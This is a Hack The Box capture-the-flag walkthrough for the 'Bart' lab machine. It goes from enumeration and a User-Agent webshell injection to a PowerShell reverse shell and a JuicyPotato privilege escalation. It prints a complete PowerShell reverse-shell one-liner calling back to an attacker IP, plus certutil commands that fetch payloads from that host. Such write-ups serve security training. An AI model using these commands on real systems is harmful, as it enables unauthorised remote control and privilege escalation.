# HTB - Bart

#### Ip: 10.10.10.81
#### Name: Bart
#### Difficulty: Medium

----------------------------------------------------------------------

Bart.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Bart]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.81 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 12:14 CDT
Nmap scan report for 10.10.10.81
Host is up (0.066s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.70 seconds
```

Ok looks like just port 80 is open here. Lets add forum.bart.htb to our `/etc/hosts` file.

Taking a look at the webpage we find a company page:

site.png

taking a look at the page source we also find a comment left behind that includes a name:

name.png

Because port 80 redirected to forum.bart.htb I wondered if there were more domains we could fuzz. Lets try using wfuzz:

wfuzz.png

Ok cool, looks like there is also a monitor.bart.htb- lets add that to `/etc/hosts` as well.

This leads us to a server monitor page. 

monitor.png

Because we've found the username harvey, I tried some random passwords and got lucky logging in with the credentials harvey:potter, which we found in the page source comment on forum.bart.htb. 

login.png

Looking in the Severs section of the page we find yet another domain to add to `/etc/hosts`

Navigating to the site we find another login page:

dev.png

Trying the credentials harvey:potter again we get a verbose error message `The Password must be at least 8 characters`. But if we try a user we know won't exist like testing:testing123 we get the message `Invalid Username or Password`. This leads me to believe that the user harvey is a valid username here. 

Trying some more directory scanning we find the page http://internal-01.bart.htb/simple_chat/register_form.php. Navigating to the page we get the message `The page cannot be displayed because an internal server error has occurred.`

Searching Google for simple_chat/register_form.php I find this GitHub page which contains source code for the page. https://github.com/magkopian/php-ajax-simple-chat/blob/master/simple_chat/register.php

gh.png

Cool, looks like the page wants two fields uname and passwd. Lets try creating a new user using curl and making a POST request to /register.php

```text
┌──(ryan㉿kali)-[~/HTB/Bart]
└─$ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=testing&passwd=password123"
```

Nice, that seemed to work. Lets return to the login page and authenticate.

in.png

Awesome, that worked! 

Taking a look at the source code we find an interesting link and function:

source.png

Capturing this in Burp and playing around with it a bit, I find that the User Agent field is vulnerable. I can inject a webshell into the field and get execution on the box:

php.png

whoami.png

Heading over to https://www.revshells.com/ and grabbing a PowerShell reverse shell and URL encoding it, I can set up a NetCat listener and get a reverse shell back:

burp.png

```text
┌──(ryan㉿kali)-[~/HTB/Bart]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.10.81] 50147
whoami
nt authority\iusr
PS C:\inetpub\wwwroot\internal-01\log> hostname
BART
PS C:\inetpub\wwwroot\internal-01\log>
```

### Privilege Escalation

At this point, I still don't seem to have access to the user.txt flag, so let's try to escalate privileegs to administrator.

Running `whoami /all` I see that `SeImpersonatePrivilege` is enabled. This means we may be able to try something like juicy potato to escalate privileges. 

First we'll need to create a file called shell.bat:

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.72',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Then we'll need to transfer to the target the shell.bat file as well as juicy potato:

```text
certutil -urlcache -split -f "http://10.10.14.72/shell.bat"

certutil -urlcache -split -f "http://10.10.14.72/JuicyPotato.exe"
```

```text
PS C:\TEMP> dir


    Directory: C:\TEMP


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       06/09/2023     19:24         347648 JuicyPotato.exe               
-a----       06/09/2023     19:23            522 shell.bat 
```

Next we'll set up a NetCat listener and run:

```text
C:\TEMP\JuicyPotato.exe -l 444 -p C:\TEMP\shell.bat -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
```

And we will catch a shell back as nt authority\ system!

jp.png

All we have to do now is grab the user.txt and root.txt flags:

flags.png

Thanks for following along!

-Ryan

----------------------------------------